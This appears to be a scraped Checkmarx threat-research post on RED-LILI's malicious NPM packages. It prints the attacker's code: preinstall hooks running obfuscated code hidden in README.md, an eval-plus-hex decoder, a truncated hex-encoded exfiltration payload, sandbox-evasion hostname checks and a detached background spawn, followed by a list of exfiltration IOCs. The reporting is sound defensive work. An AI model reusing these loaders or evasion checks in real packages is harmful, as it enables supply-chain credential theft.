{
    "id": "<report_0x79bad492>",
    "url": "https://checkmarx.com/blog/attacker-adds-evasive-technique-to-their-ongoing-attacks-on-npm",
    "title": "Attacker Adds Evasive Technique to Their Ongoing Attacks on NPM. Intro",
    "meta": [
        {
            "id": "<chapter_0x6576ba2b>",
            "title": "Attacker Adds Evasive Technique to Their Ongoing Attacks on NPM",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xde01565a>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xabef4fc4>": "https://checkmarx.com/author/talfolkman/",
                        "<a_0xedd32642>": "https://checkmarx.com/2022/04/26/"
                    },
                    "text": "Tal Folkman<crlf>Co-author Aviad Gershon<crlf>April 26, 2022<crlf>Reading Time: 5 minutes",
                    "html": "<ul class=\"elementor-inline-items elementor-icon-list-items elementor-post-info\">\n<li class=\"elementor-icon-list-item elementor-repeater-item-ca6b85f elementor-inline-item\">\n<a href=\"https://checkmarx.com/author/talfolkman/\">\n \n\t\t\t\t\t\t\t\t\t\tTal Folkman\t\t\t\t\t\n</a>\n</li>\n<li class=\"elementor-icon-list-item elementor-repeater-item-54ddca2 elementor-inline-item\">\n \n\t\t\t\t\t\t\t\t\t\tCo-author Aviad Gershon\t\t\t\t\t\n</li>\n<li class=\"elementor-icon-list-item elementor-repeater-item-e9bbb12 elementor-inline-item\">\n<a href=\"https://checkmarx.com/2022/04/26/\">\n \n\t\t\t\t\t\t\t\t\t\tApril 26, 2022\t\t\t\t\t\n</a>\n</li>\n<li class=\"elementor-icon-list-item elementor-repeater-item-4abea3a elementor-inline-item\">\n \n\t\t\t\t\t\t\t\t\t\tReading Time: 5 minutes\t\t\t\t\t\n</li>\n</ul>"
                },
                {
                    "id": "<sentence_0x4b9ab088>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Never miss an update. Subscribe today!",
                    "html": "<p>Never miss an update. Subscribe today!</p>"
                },
                {
                    "id": "<sentence_0xebfcc825>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Email*Lifecycle StageMarketing AssetUTM CampaignUTM ContentUTM KeywordUTM MediumUTM SourceGCLIDAll UTMs",
                    "html": "Email*Lifecycle StageMarketing AssetUTM CampaignUTM ContentUTM KeywordUTM MediumUTM SourceGCLIDAll UTMs"
                },
                {
                    "id": "<sentence_0x1de559b9>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p> </p>"
                },
                {
                    "id": "<sentence_0x5e997fd3>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "I would like to receive communications from Checkmarx and its affiliates regarding software security, Checkmarx products and services.",
                    "html": "<ul class=\"inputs-list\"><li class=\"hs-form-booleancheckbox\"><p>I would like to receive communications from Checkmarx and its affiliates regarding software security, Checkmarx products and services. </p></li></ul>"
                },
                {
                    "id": "<sentence_0xb53700d1>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xeb12e357>": "https://www.checkmarx.com/privacy-policy/"
                    },
                    "text": "By submitting my information to Checkmarx, I hereby consent to the terms and conditions found in the Checkmarx Privacy Policy and to the processing of my personal data as described therein.",
                    "html": "<p>By submitting my information to Checkmarx, I hereby consent to the terms and conditions found in the Checkmarx <a href=\"https://www.checkmarx.com/privacy-policy/\" target=\"_blank\">Privacy Policy</a> and to the processing of my personal data as described therein. </p>"
                },
                {
                    "id": "<sentence_0xaac1be79>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "By clicking submit below, you consent to allow Checkmarx to store and process the personal information submitted above to provide you the content requested.",
                    "html": "<p>By clicking submit below, you consent to allow Checkmarx to store and process the personal information submitted above to provide you the content requested.</p>"
                },
                {
                    "id": "<sentence_0x4b35d14b>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x76f5a02a>": "https://checkmarx.com/wp-content/uploads/2021/06/4-circles-yellow-vert.png"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"attachment-large size-large\" height=\"437\" src=\"https://checkmarx.com/wp-content/uploads/2021/06/4-circles-yellow-vert.png\" width=\"87\"/>"
                },
                {
                    "id": "<sentence_0x6823776c>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x22dc1a38>": "https://checkmarx.com/wp-content/uploads/2022/04/red-lili-thumbnail.png"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"attachment-large size-large\" height=\"512\" src=\"https://checkmarx.com/wp-content/uploads/2022/04/red-lili-thumbnail.png\" width=\"1024\"/>"
                }
            ]
        },
        {
            "id": "<chapter_0xe5b0556>",
            "title": "Intro",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x222a6853>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "A few weeks ago, we wrote about a new threat actor we called RED-LILI and described their capabilities, including an in-depth walkthrough of the automated system for publishing malicious NPM packages from automatically created user accounts.<crlf>After our publication, we have seen this same attacker changing their techniques and adding new exfiltration targets, enhancing evasive abilities in an attempt to slow down researchers, and even trying to communicate with the researchers using package names (such as fuckyouscanner).",
                    "html": "<p>A few weeks ago, we wrote about a new threat actor we called RED-LILI and described their capabilities, including an in-depth walkthrough of the automated system for publishing malicious NPM packages from automatically created user accounts.\nAfter our publication, we have seen this same attacker changing their techniques and adding new exfiltration targets, enhancing evasive abilities in an attempt to slow down researchers, and even trying to communicate with the researchers using package names (such as \u201cfuckyouscanner\u201d).</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xe0be9324>",
            "title": "Message in a bottle",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xa625e43a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Shortly after our publication, and probably in light of the communitys joint efforts in taking down RED-LILIs malicious packages, we started seeing that some of the packages names diverging from the normal pattern and seem to try and relay messages such as:",
                    "html": "<p>Shortly after our publication, and probably in light of the community\u2019s joint efforts in taking down RED-LILI\u2019s malicious packages, we started seeing that some of the package\u2019s names diverging from the normal pattern and seem to try and relay messages such as:</p>"
                },
                {
                    "id": "<sentence_0x45aa3984>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "dontbelikethat<crlf>notsobrilliant<crlf>dontgothereever<crlf>dontblowthisoff<crlf>heisnotwhatyousee<crlf>helloboy634<crlf>nosoawesome232<crlf>fuckyouscanner",
                    "html": "<ul><li>dontbelikethat</li><li>notsobrilliant</li><li>dontgothereever</li><li>dontblowthisoff</li><li>heisnotwhatyousee</li><li>helloboy634</li><li>nosoawesome232</li><li>fuckyouscanner</li></ul>"
                }
            ]
        },
        {
            "id": "<chapter_0x7bfaa69>",
            "title": "Hidden Malicious Code in Text Files",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xbb51fb13>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Most of these message in a bottle packages such as the package dontgothereever introduced a new tactic. Instead of the normal preinstall script:",
                    "html": "<p>Most of these \u201cmessage in a bottle\u201d packages such as the package \u201cdontgothereever\u201d introduced a new tactic. Instead of the normal preinstall script:</p>"
                },
                {
                    "id": "<sentence_0x9e4759cb>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0xe25c2e8d>": "\"scripts\":{\n \"test\":\"echo 'error no test specified' && exit 1\",\n \"preinstall\":\"node index.js\"\n },"
                    },
                    "text": "",
                    "html": "<code>\"scripts\":{\n \"test\":\"echo 'error no test specified' &amp;&amp; exit 1\",\n \"preinstall\":\"node index.js\"\n },</code>"
                },
                {
                    "id": "<sentence_0x156495d2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "They move the malicious code to lib/README.md or README.md, obfuscated it, and run it from the preinstall script as before:",
                    "html": "<p>They move the malicious code to \u201clib/README.md\u201d or \u201cREADME.md\u201d, obfuscated it, and run it from the preinstall script as before:</p>"
                },
                {
                    "id": "<sentence_0x774c8fc3>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0xdd0c99bd>": "\"scripts\":{\n \"test\":\"echo 'error no test specified' && exit 1\",\n \"preinstall\":\"node lib/README.md\"\n }"
                    },
                    "text": "",
                    "html": "<code>\"scripts\":{\n \"test\":\"echo 'error no test specified' &amp;&amp; exit 1\",\n \"preinstall\":\"node lib/README.md\"\n }</code>"
                },
                {
                    "id": "<sentence_0x5d4a4ce5>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xdd0ea5d1>": "https://checkmarx.com/wp-content/uploads/2022/04/image_3.png"
                    },
                    "text": "",
                    "html": "<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-75563\" height=\"428\" src=\"https://checkmarx.com/wp-content/uploads/2022/04/image_3.png\" width=\"747\"/></figure>"
                },
                {
                    "id": "<sentence_0x3424d675>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "obfuscated README.md",
                    "html": "<p class=\"has-text-align-center\">obfuscated README.md</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x3e7bdfd7>",
            "title": "Stolen Package Description",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x7b4d6a62>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x8630bccd>": "https://github.com/raincatcher-beta/raincatcher-file#supported-storage-engines"
                    },
                    "text": "Another experiment with the package description files in RED-LILIs recent attacks, which we saw in the wf_storage package for example, is the attacker stealing another projects description (https://github.com/raincatcher-beta/raincatcher-file#supported-storage-engines). In an attempt to make the package look more credible.",
                    "html": "<p>Another experiment with the package description files in RED-LILI\u2019s recent attacks, which we saw in the \u201cwf_storage\u201d package for example, is the attacker stealing another project\u2019s description (<a href=\"https://github.com/raincatcher-beta/raincatcher-file#supported-storage-engines\" rel=\"noreferrer noopener\" target=\"_blank\">https://github.com/raincatcher-beta/raincatcher-file#supported-storage-engines</a>). In an attempt to make the package look more credible.</p>"
                },
                {
                    "id": "<sentence_0xaa8cf4c1>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xf366c587>": "https://checkmarx.com/wp-content/uploads/2022/04/image_4-1024x994.png"
                    },
                    "text": "",
                    "html": "<figure class=\"aligncenter size-large is-resized\"><img alt=\"\" class=\"wp-image-75564\" height=\"815\" src=\"https://checkmarx.com/wp-content/uploads/2022/04/image_4-1024x994.png\" width=\"840\"/></figure>"
                },
                {
                    "id": "<sentence_0x63e35066>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Stolen project description appears in the malicious package, taken from a random GitHub page",
                    "html": "<p class=\"has-text-align-center\">Stolen project description appears in the malicious package, taken from a random GitHub page</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x3a03b750>",
            "title": "eval() & hexilify() a match made in hell",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xc5980457>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Another new obfuscation technique we observed, in turbine_helper for example, is a combined usage of the nefarious built-in function eval() and the hexilify() function written by the packages developer.",
                    "html": "<p>Another new obfuscation technique we observed, in \u201cturbine_helper\u201d for example, is a combined usage of the nefarious built-in function \u201ceval()\u201d and the \u201chexilify()\u201d function written by the package\u2019s developer.</p>"
                },
                {
                    "id": "<sentence_0xac47f09f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "We saw two different usages of this combination:",
                    "html": "<p>We saw two different usages of this combination:</p>"
                },
                {
                    "id": "<sentence_0xd293b114>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x19e4b350>": "function render(image){\neval(hexify(package,hexify(package,image)));}"
                    },
                    "text": "",
                    "html": "<code>function render(image){\neval(hexify(package,hexify(package,image)));}</code>"
                },
                {
                    "id": "<sentence_0x187354cc>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Or:",
                    "html": "<p>Or:</p>"
                },
                {
                    "id": "<sentence_0x9a6f854b>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x93f1b775>": "eval(hexilify(package,img))"
                    },
                    "text": "",
                    "html": "<code>eval(hexilify(package,img))</code>"
                },
                {
                    "id": "<sentence_0x61bfdbc3>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "the hexilify() functions main purpose is to decode hexadecimal string into the original code.",
                    "html": "<p>the \u201chexilify()\u201d function\u2019s main purpose is to decode hexadecimal string into the original code.</p>"
                },
                {
                    "id": "<sentence_0xaf52f64>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x6256493e>": "function hexilify(pack,data) {\n const bufferText = Buffer.from(data, 'hex');\n const text = bufferText.toString('ascii');\n return text.replace('%%%%%%',pack);\n}"
                    },
                    "text": "",
                    "html": "<code>function hexilify(pack,data) {\n const bufferText = Buffer.from(data, 'hex');\n const text = bufferText.toString('ascii');\n return text.replace('%%%%%%',pack);\n}</code>"
                },
                {
                    "id": "<sentence_0x2dc18782>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The hex encoded input to this function varies slightly between the different packages using it, but it looks roughly as follows:",
                    "html": "<p>The hex encoded input to this function varies slightly between the different packages using it, but it looks roughly as follows:</p>"
                },
                {
                    "id": "<sentence_0x33187db6>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0xfe4a8728>": "img=\"636f6e7374206f73203d207265717569726528226f7322293b0a636f6e737420646e73203d20726571756972652822646e7322293b0a636f6e7374207175657279737472696e67203d207265717569726528227175657279737472696e6722293b0a636f6e7374206874747073203d20726571756972652822687474707322293b0a636f6e7374206673203d20726571756972652827667327293b0a766172207061\u2026\n571203d2068747470732e72657175657374286f7074696f6e732c202872657329203d3e207b0a20202020202020207265732e6f6e282264617461222c20286429203d3e207b0a2020202020202020202020202f2f70726f636573732e7374646f75742e77726974652864293b0a20202020202020207d293b0a202020207d293b0a0a202020207265712e6f6e28226572726f72222c20286529203d3e207b0a20202020202020202f2f20636f6e736f6c652e6572726f722865293b0a202020207d293b0a0a202020207265712e777269746528706f737444617461293b0a202020207265712e656e6428293b0a7d\";"
                    },
                    "text": "",
                    "html": "<code>img=\"636f6e7374206f73203d207265717569726528226f7322293b0a636f6e737420646e73203d20726571756972652822646e7322293b0a636f6e7374207175657279737472696e67203d207265717569726528227175657279737472696e6722293b0a636f6e7374206874747073203d20726571756972652822687474707322293b0a636f6e7374206673203d20726571756972652827667327293b0a766172207061\u2026\n571203d2068747470732e72657175657374286f7074696f6e732c202872657329203d3e207b0a20202020202020207265732e6f6e282264617461222c20286429203d3e207b0a2020202020202020202020202f2f70726f636573732e7374646f75742e77726974652864293b0a20202020202020207d293b0a202020207d293b0a0a202020207265712e6f6e28226572726f72222c20286529203d3e207b0a20202020202020202f2f20636f6e736f6c652e6572726f722865293b0a202020207d293b0a0a202020207265712e777269746528706f737444617461293b0a202020207265712e656e6428293b0a7d\";</code>"
                },
                {
                    "id": "<sentence_0x7b146c25>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "the hexilify() is also used in other parts of the code to hinder defenders using static analysis by obfuscating strings that may use to identify this attackers activity.",
                    "html": "<p>the \u201chexilify()\u201d is also used in other parts of the code to hinder defenders using static analysis by obfuscating strings that may use to identify this attacker\u2019s activity.</p>"
                },
                {
                    "id": "<sentence_0xd0c54a54>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x6b7de9a4>": "function isValid(hostname, path, username) {\n if (hostname == unhexify(\"4445534b544f502d3445314953304b\") && username == unhexify(\"6461617361646d696e\")) {\n return false;\n } else if (hostname == unhexify('626f78')) {\n return false;\n } else if (checkhex(hostname)) {\n return false;\n } else if (checkuuid(hostname)) {\n return false;\n }\n else if (hostname == unhexify('6c696c692d7063')) {\n return false;\n } else if (hostname == unhexify('6177732d3767726172613931336f6964356a736578676b71')) {\n return false;\n }\n else if (hostname == unhexify('696e7374616e6365')) {\n return false;\n } else {\n return true;\n }\n return true;\n}"
                    },
                    "text": "",
                    "html": "<code>function isValid(hostname, path, username) {\n if (hostname == unhexify(\"4445534b544f502d3445314953304b\") &amp;&amp; username == unhexify(\"6461617361646d696e\")) {\n return false;\n } else if (hostname == unhexify('626f78')) {\n return false;\n } else if (checkhex(hostname)) {\n return false;\n } else if (checkuuid(hostname)) {\n return false;\n }\n else if (hostname == unhexify('6c696c692d7063')) {\n return false;\n } else if (hostname == unhexify('6177732d3767726172613931336f6964356a736578676b71')) {\n return false;\n }\n else if (hostname == unhexify('696e7374616e6365')) {\n return false;\n } else {\n return true;\n }\n return true;\n}</code>"
                },
                {
                    "id": "<sentence_0xcf32d383>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Usage of the hexilify function",
                    "html": "<p class=\"has-text-align-center\">Usage of the hexilify function</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xb1fc3268>",
            "title": "isValid() adjustments",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xa9dd8cb0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "In the field of security scanners detection, we saw a minor change in the isValid() function, which is meant to detect hostnames and usernames belonging to scanners or other machines the attacker want to avoid from running on.",
                    "html": "<p>In the field of security scanners\u2019 detection, we saw a minor change in the \u201cisValid()\u201d function, which is meant to detect hostnames and usernames belonging to scanners or other machines the attacker want to avoid from running on.</p>"
                },
                {
                    "id": "<sentence_0x3777ccee>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "In the package bfs-hello-world for example, we saw a new regex which was made to detect uuids (Universal Unique Identifier) and keep the code from running in these environments. This is possibly because the attacker noticed security scanners with uuids as hostnames and tried to avoid it as well.",
                    "html": "<p>In the package \u201cbfs-hello-world\u201d for example, we saw a new regex which was made to detect \u201cuuid\u201ds (Universal Unique Identifier) and keep the code from running in these environments. This is possibly because the attacker noticed security scanners with \u201cuuid\u201ds as hostnames and tried to avoid it as well.</p>"
                },
                {
                    "id": "<sentence_0xa89b3e4f>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0xade872e1>": "function checkuuid(inputString) {\n var re = /^[0-9a-f]+-[0-9a-f]+-[0-9a-f]+-[0-9a-f]+-[0-9a-f]+$/g;\n if (re.test(inputString)) {\n return true\n } else {\n return false;\n }\n}"
                    },
                    "text": "",
                    "html": "<code>function checkuuid(inputString) {\n var re = /^[0-9a-f]+-[0-9a-f]+-[0-9a-f]+-[0-9a-f]+-[0-9a-f]+$/g;\n if (re.test(inputString)) {\n return true\n } else {\n return false;\n }\n}</code>"
                }
            ]
        },
        {
            "id": "<chapter_0x10a9cf02>",
            "title": "Using 'child_process'",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x244134ac>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "In the package bfx-hf-func-data, we saw for the first time the usage of child_process from this attacker. Here, the preinstall script still runs the index.js file upon package installation, but this file itself contains different code with include the following snippets:",
                    "html": "<p>In the package \u201cbfx-hf-func-data\u201d, we saw for the first time the usage of \u201cchild_process\u201d from this attacker. Here, the preinstall script still runs the index.js file upon package installation, but this file itself contains different code with include the following snippets:</p>"
                },
                {
                    "id": "<sentence_0x1adfba5f>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x7bc12c4a>": "var spawn = require('child_process').spawn;\nspawn('node', ['bgService.js',process.pid], {\n stdio: 'ignore', // piping all stdio to /dev/null\n detached: true\n}).unref();"
                    },
                    "text": "",
                    "html": "<code>var spawn = require('child_process').spawn;\nspawn('node', ['bgService.js',process.pid], {\n stdio: 'ignore', // piping all stdio to /dev/null\n detached: true\n}).unref();</code>"
                },
                {
                    "id": "<sentence_0x6bf9cea2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "These lines of code spawn a child process that runs the bgService.js file which contains the same hex encoded malicious code we saw before.",
                    "html": "<p>These lines of code spawn a child process that runs the bgService.js file which contains the same hex encoded malicious code we saw before.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x333d80e4>",
            "title": "The Next Attack Wave is Coming",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x238f98d2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Since the previous wave we wrote about in our first blogpost about the attacker, RED-LILI have slowed down and paused the burst automation attacks. They dumped their old domain names and registered a new domain (22timer[.]ga). We believe the next wave is yet to come and that RED-LILI is now exploring and publishing cherry-picked packages, each with different evasion technique.",
                    "html": "<p>Since the previous wave we wrote about in our first blogpost about the attacker, RED-LILI have slowed down and paused the burst automation attacks. They dumped their old domain names and registered a new domain (22timer[.]ga). We believe the next wave is yet to come and that RED-LILI is now exploring and publishing cherry-picked packages, each with different evasion technique.</p>"
                },
                {
                    "id": "<sentence_0x83bda909>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "However, the attackers thumbprint still remains as they re-use similar characteristics (code similarity, same identifying strings, etc.). In recent packages they are doing it while exfiltrating the data they collect to previously unknown addresses on different services, from what we have seen before such as free webhook services, for example, pipedream and requestbin.",
                    "html": "<p>However, the attacker\u2019s thumbprint still remains as they re-use similar characteristics (code similarity, same identifying strings, etc.). In recent packages they are doing it while exfiltrating the data they collect to previously unknown addresses on different services, from what we have seen before such as free webhook services, for example, pipedream and requestbin.</p>"
                },
                {
                    "id": "<sentence_0xb54d13cc>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xd946683d>": "https://checkmarx.com/wp-content/uploads/2022/04/image_5-1024x670.png"
                    },
                    "text": "",
                    "html": "<figure class=\"aligncenter size-large\"><img alt=\"\" class=\"wp-image-75565\" height=\"670\" src=\"https://checkmarx.com/wp-content/uploads/2022/04/image_5-1024x670.png\" width=\"1024\"/></figure>"
                },
                {
                    "id": "<sentence_0x483202a9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "old domains",
                    "html": "<p class=\"has-text-align-center\">old domains</p>"
                },
                {
                    "id": "<sentence_0xea5536b7>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xac6e624b>": "https://checkmarx.com/wp-content/uploads/2022/04/image_6.png"
                    },
                    "text": "",
                    "html": "<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-75566\" height=\"474\" src=\"https://checkmarx.com/wp-content/uploads/2022/04/image_6.png\" width=\"995\"/></figure>"
                },
                {
                    "id": "<sentence_0x25638661>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "new 22timer.ga domain",
                    "html": "<p class=\"has-text-align-center\">new 22timer.ga domain</p>"
                },
                {
                    "id": "<sentence_0xe8fa485e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Some of the latest packages published have also showed slight changes in regard to the user accounts publishing them. Up until now we were used to randomly generated usernames publishing a single package per account. However, the recent packages RED-LILI have published were from the usernames john.moralis and leftwing_tenore with the latter publishing 5 different packages.",
                    "html": "<p>Some of the latest packages published have also showed slight changes in regard to the user accounts publishing them. Up until now we were used to randomly generated usernames publishing a single package per account. However, the recent packages RED-LILI have published were from the usernames \u201cjohn.moralis\u201d and \u201cleftwing_tenore\u201d with the latter publishing 5 different packages.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x8b08e853>",
            "title": "Conclusion",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x1068a84>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "In the past weeks, Checkmarx supply chain security team is tracking the threat actor RED-LILI which is constantly developing its capabilities. In this blog we reported about RED-LILIs recent changes in code and TTPs.",
                    "html": "<p>In the past weeks, Checkmarx supply chain security team is tracking the threat actor RED-LILI which is constantly developing its capabilities. In this blog we reported about RED-LILI\u2019s recent changes in code and TTP\u2019s.</p>"
                },
                {
                    "id": "<sentence_0xcd6ff08e>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xaec7882e>": "https://red-lili.info",
                        "<a_0xde3df75e>": "https://www.linkedin.com/signup/cold-join?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2Ffeed%2Fhashtag%2Fopensource&trk=public_post_share-update_update-text"
                    },
                    "text": "Furthermore, our research team has launched red-lili.info - an open source mini-project tracking the attacker's packages over time, while sharing analysis findings.",
                    "html": "<p>Furthermore, our research team has launched <a href=\"https://red-lili.info\" rel=\"noreferrer noopener\" target=\"_blank\">red-lili.info</a> - an <a href=\"https://www.linkedin.com/signup/cold-join?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2Ffeed%2Fhashtag%2Fopensource&amp;trk=public_post_share-update_update-text\" rel=\"noreferrer noopener\" target=\"_blank\">open source</a> mini-project tracking the attacker's packages over time, while sharing analysis findings.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x435e62a1>",
            "title": "IOCs",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x6753996>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "eome8ew0yti04in.m.pipedream[.]net<crlf>eo74s7cfv23fror.m.pipedream[.]net<crlf>33mail[.]ga<crlf>636o3.fuzzdb[.]cf<crlf>3faa13bc25347fa55cff.d.requestbin[.]net<crlf>425a2.33mail[.]ga<crlf>22timer[.]ga",
                    "html": "<ul><li>eome8ew0yti04in.m.pipedream[.]net</li><li>eo74s7cfv23fror.m.pipedream[.]net</li><li>33mail[.]ga</li><li>636o3.fuzzdb[.]cf</li><li>3faa13bc25347fa55cff.d.requestbin[.]net</li><li>425a2.33mail[.]ga</li><li>22timer[.]ga</li></ul>"
                }
            ]
        },
        {
            "id": "<chapter_0xd8606f5b>",
            "title": "Packages",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x257ccbdc>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xa3d6c70e>": "https://checkmarx.com/wp-content/uploads/2022/04/1.jpg"
                    },
                    "text": "",
                    "html": "<figure class=\"wp-block-image size-full\"><img alt=\"\" class=\"wp-image-75573\" height=\"854\" src=\"https://checkmarx.com/wp-content/uploads/2022/04/1.jpg\" width=\"505\"/></figure>"
                },
                {
                    "id": "<sentence_0x8a4e102>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xf13721af>": "https://checkmarx.com/wp-content/uploads/2022/04/2.jpg"
                    },
                    "text": "",
                    "html": "<figure class=\"wp-block-image size-full\"><img alt=\"\" class=\"wp-image-75575\" height=\"762\" src=\"https://checkmarx.com/wp-content/uploads/2022/04/2.jpg\" width=\"506\"/></figure>"
                },
                {
                    "id": "<sentence_0xdabadf03>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xf2dd2bf0>": "https://checkmarx.com/wp-content/uploads/2022/04/3.jpg"
                    },
                    "text": "",
                    "html": "<figure class=\"wp-block-image size-full\"><img alt=\"\" class=\"wp-image-75576\" height=\"282\" src=\"https://checkmarx.com/wp-content/uploads/2022/04/3.jpg\" width=\"508\"/></figure>"
                },
                {
                    "id": "<sentence_0x105e299f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Never miss an update. Subscribe today!",
                    "html": "<p>Never miss an update. Subscribe today!</p>"
                },
                {
                    "id": "<sentence_0xb3921036>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Email*Lifecycle StageMarketing AssetUTM CampaignUTM ContentUTM KeywordUTM MediumUTM SourceGCLIDAll UTMs",
                    "html": "Email*Lifecycle StageMarketing AssetUTM CampaignUTM ContentUTM KeywordUTM MediumUTM SourceGCLIDAll UTMs"
                },
                {
                    "id": "<sentence_0x52eebbde>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p> </p>"
                },
                {
                    "id": "<sentence_0x66dc91bf>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "I would like to receive communications from Checkmarx and its affiliates regarding software security, Checkmarx products and services.",
                    "html": "<ul class=\"inputs-list\"><li class=\"hs-form-booleancheckbox\"><p>I would like to receive communications from Checkmarx and its affiliates regarding software security, Checkmarx products and services. </p></li></ul>"
                },
                {
                    "id": "<sentence_0xe9ee6570>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xeb12e357>": "https://www.checkmarx.com/privacy-policy/"
                    },
                    "text": "By submitting my information to Checkmarx, I hereby consent to the terms and conditions found in the Checkmarx Privacy Policy and to the processing of my personal data as described therein.",
                    "html": "<p>By submitting my information to Checkmarx, I hereby consent to the terms and conditions found in the Checkmarx <a href=\"https://www.checkmarx.com/privacy-policy/\" target=\"_blank\">Privacy Policy</a> and to the processing of my personal data as described therein. </p>"
                },
                {
                    "id": "<sentence_0xdb42c7a5>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "By clicking submit below, you consent to allow Checkmarx to store and process the personal information submitted above to provide you the content requested.",
                    "html": "<p>By clicking submit below, you consent to allow Checkmarx to store and process the personal information submitted above to provide you the content requested.</p>"
                }
            ]
        }
    ],
    "chapters": [
        {
            "id": "<chapter_0xc9de8973>",
            "title": "Attacker Adds Evasive Technique to Their Ongoing Attacks on NPM",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xbbcb3478>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x16537e5d>": "https://checkmarx.com/"
                    },
                    "text": "Home Attacker Adds Evasive Technique to Their Ongoing Attacks on NPM",
